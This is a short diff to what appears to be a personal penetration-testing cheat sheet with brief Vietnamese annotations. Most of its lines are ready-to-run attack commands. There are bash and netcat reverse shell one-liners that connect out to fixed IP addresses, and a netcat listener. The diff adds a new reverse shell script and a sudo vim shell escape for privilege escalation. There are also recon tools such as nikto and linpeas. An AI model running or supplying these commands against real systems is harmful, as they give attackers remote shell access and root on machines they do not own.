@@ -6,6 +6,9 @@ arp-scan -l (giong netdiscover)
 
 bash -i >& /dev/tcp/192.168.0.102/8080 0>&1
 
+( #!bin/bash
+  bash -c 'bash -i >& /dev/tcp/192.168.1.101/9001 0>&1' )( chay bang file shell)
+
 
 nc -e /bin/bash 192.168.10.10 4444 
 nc -lvnp 4444
@@ -42,8 +45,7 @@ nikto -h http://192.168.0.106:8080
 exiftool .cypher-neo.png ( lay info cua anh) 
 linpeas.sh ( tu dong thu thap thong tin ve muc tieu nhu la cac lo hong)
 
-CVE-2022-0847-DirtyPipe-Exploits ( leo thang dac quyen)
-
+sudo -l --> sudo /usr/bin/vim -c ':!/bin/sh' (vim) 
 
 https://search.censys.io/
 https://www.crunchbase.com/
